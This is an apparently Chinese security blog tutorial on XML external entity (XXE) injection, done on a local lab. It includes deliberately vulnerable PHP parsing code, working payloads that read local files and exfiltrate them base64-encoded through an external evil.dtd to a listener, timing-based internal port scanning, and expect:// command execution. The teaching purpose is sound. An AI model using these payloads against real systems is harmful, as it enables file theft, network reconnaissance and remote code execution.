---
abbrlink: ''
categories:
- - Web安全
date: '2026-03-30T22:45:32.672503+08:00'
tags:
- XXE
title: XXE 漏洞原理与利用
updated: '2026-03-30T22:45:35.493+08:00'
---
XXE(XML External Injection)全称为 XML 外部实体注入，这里要强调的是外部实体，外部实体注入是我们的利用点，为什么要强调这个呢？因为普通的 XML 注入比较鸡肋，现实中几乎用不到。如果在实战中能够注入外部实体并且能够成功解析的话，会大大拓宽我们的攻击面。

## XML 背景

XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，...），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，...），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。

在解析外部实体的过程中，XML 解析器可以根据 URI 中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。

## 基础知识

XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。

XML 文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

示例：

```xml
<!--XML声明-->
<?xml version="1.0"?> 
<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

内部声明 DTD

```xml
<!DOCTYPE 根元素 [元素声明]>
```

引用外部 DTD

```xml
<!DOCTYPE 根元素 SYSTEM "外部文件名" >
<!DOCTYPE 根元素 PUBLIC "DTD 名称" "DTD 文件的 URI">
```

一些重要的关键字如下:

* DOCTYPE：DTD 的声明
* ENTITY：实体的声明，实体你可以理解为变量
* SYSTEM、PUBLIC：外部资源申请

不同语言的协议支持：

![image](https://img2.eval.moe/image-20260326105934-rrqkcut.png)

php 支持的扩展协议：

![image](https://img2.eval.moe/image-20260326110029-kis2yr1.png)、

> libxml 是 php 对 xml 的支持
>
> 在 java 中 netdoc 协议能代替 file 协议

## 基础知识之重点一

XML 分为内部实体和外部实体，实体是什么？你可以理解为是一个变量，然后这个变量既可以从外部引入，也可以内部定义。

内部实体示例如下，这里定义元素为 ANY 说明接受任何元素，要想引用实体的话要在实体前面加 &，比如这里的 &xxe，输出的时候 &xxe 会被 "test" 替换：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >]>
```

外部实体示例如下，当执行该 xml 时， &xxe 会被 win.ini 的文件内容替换掉，这样的话可以自动更新对所有引用资源所做的更改，非常之方便，但安全呢......一点都不安全：

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
<user>&xxe</user>
```

除了上面两个之外，还有一种引用方式是使用引用公用 DTD，语法如下：

```xml
<!DOCTYPE 根元素名称 PUBLIC "DTD标识名" "公用DTD的URI">
```

## 基础知识之重点二

在上面，我们将实体分为了两个派别，分别四内部实体和外部实体，但从另一个角度看，实体也可以分为另外两个派别——分别是通用实体和参数实体

通用实体如下，用 &实体名; 引用的实体，它在 DTD 中定义，在 XML 文档中引用

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [<!ENTITY file SYSTEM "file:///C:/Windows/win.ini">]>
<foo>&file;</foo>
```

参数实体的话，有以下要求：

1. 使用 % 实体名(这里的空格不能少)
2. 在 DTD 中定义，且只能在 DTD 中使用 % 实体名 引用
3. 只有在 DTD 中，参数实体才能引用其他的参数实体
4. 和通用实体一样，参数实体也可以外部引用

```xml
<!ENTITY % aaa "<!ELEMENT mytag (subtag)>"> #mytag (subtag)中间的空格不能漏
<!ENTITY % bbb SYSTEM "http://example/remote.dtd">
%aaa;%bbb;
```

## XXE 能干什么

当允许引用外部实体时，通过构造恶意内容，可导致

* 读取任意文件
* 探测内网端口
* 攻击内网网站
* 执行系统命令

## 渗透环境搭建

环境：phpstudy(Apache + php 5.4.45)

php 5.5 以下版本源码：

```php
?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);

# 不需要回显时 注释print($xml);
print($xml);
```

php 大于或等于 5.5 源码：

```php
?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT);

# 不需要回显时 注释print($xml);
print($xml);
```

## 实验一：有回显读取敏感文件(XXE)

这里模拟的是在服务器能够接收并解析 XML 格式的输入并且有回显的时候，我们就可以输入我们的 XML 代码，通过引用外部实体的方法，引用服务器上的文件

payload：

```xml
<?xml version="1.0" encoding='utf-8'?>
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///C:/Windows/win.ini" > 
]>
<foo>
    &file;
</foo>
```

![image](https://img2.eval.moe/image-20260327161028-87tz3uv.png)

但是是因为这个文件的内容没有什么特殊符号，如果文件内容换成这样呢？

```txt
UUID=775f5cd5-4973-4c04-9a49-3ba689385527 / ext4 errors=remount-ro 0 1
/swapfile none swap sw 0 0
sadasdasdasdadfdsf><<>>??{?
```

很明显，报错了

![image](https://img2.eval.moe/image-20260327161308-f4b42f2.png)

那么有没有解决办法呢？有的兄弟，有的，这时候我们可以拿出我们的终极杀器——CDATA

CDATA 是什么呢？在 XML 返回的结果中，有一些我们并不想让其被解析引擎解析执行，而是当作原始的字符串进行处理，你也可以把 CDATA 当作 XML 中的注释

我们改一下出问题的地方

```xml
<?xml version="1.0" encoding='utf-8'?>
<!DOCTYPE foo [
	<!ENTITY start "<![CDATA[">
    <!ENTITY file SYSTEM "file:///C:/Windows/win.ini" >  # 这里出的问题，在这里加上就行
	<!ENTITY end "]]>">
]>
<foo>
    &start;&file;&end; # 这里也要跟着改
</foo>
```

还会报错吗？会的

![image](https://img2.eval.moe/image-20260327165201-vszjy2c.png)

我们三个实体都是字符串形式，连在一起竟然报错了，这说明我们不能再 XML 中拼接，而是需要拼接以后再 XML 中调用，那么要想再 DTD 中拼接，我们有且只有一种选择——就是参数实体 + 外部实体。

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
	<!ENTITY % start "<![CDATA[">
	<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini" >
	<!ENTITY % end "]]>">
	<!ENTITY % dtd SYSTEM "http://127.0.0.1/evil.dtd" >
	%dtd;
] >
<roottag>&all;</roottag>
```

evil.dtd：

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%file;%end;" >
```

成功读取

![image](https://img2.eval.moe/image-20260327173253-5om8f9r.png)

## 实验二：无回显读取本地敏感文件

payload：

```xml
<!DOCTYPE convert [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://127.0.0.1:8000?p=%file;'>">
%file;%int;%send;
]>
```

如果直接请求体上，会报错，PHP 的 libxml 解析器在 默认安全配置 下，禁止在 DTD 内部子集中使用参数实体引用。这是安全机制，防止 XXE 攻击，所以我们要借助外部 DTD 文件进行注入。

![image](https://img2.eval.moe/image-20260327175006-fqwn2tc.png)

evil.dtd：

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://127.0.0.1:8080?p=%file;'>">
```

请求体：

```xml
<!DOCTYPE convert [  <!ENTITY % remote SYSTEM "http://127.0.0.1/evil.dtd"> %remote;%int;%send; ]>
```

点击发送后，成功返回 base64 加密后的字符串，解密后就是原文

![image](https://img2.eval.moe/image-20260327175520-h7gva2l.png)

## 实验四：内网扫描

首先在我们同一个内网中的机子开个 http 服务

```cmd
# 192.168.1.13
python -m http.server 8000
```

如果端口开放的话，响应时间很短

![image](https://img2.eval.moe/image-20260330223328-zge0p7m.png)

端口不开放的话，响应时间会很长，我们可以利用这一点写个脚本进行内网端口扫描

![image](https://img2.eval.moe/image-20260330223456-7zvak9q.png)

## 实验五：PHP expect RCE

php 默认是不安转这个扩展的，如果安装了我们就可以直接利用 XXE 进行 RCE

```xml
<!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
<dir>
<file>&cmd;</file>
</dir>
```

## 总结

XXE 这个洞很老了，但胜在支持这个的协议和框架非常多，除了文章中我写的这些，还有文件上传——仅限 java 环境、利用 smtp 的 ftp 协议配合 CRLF 注入进行邮件发送、DOS 攻击等等手法，一般来说很多基于 B-C 的 web 通信服务除了是用 json 就是用 xml，所以还是值得一学的
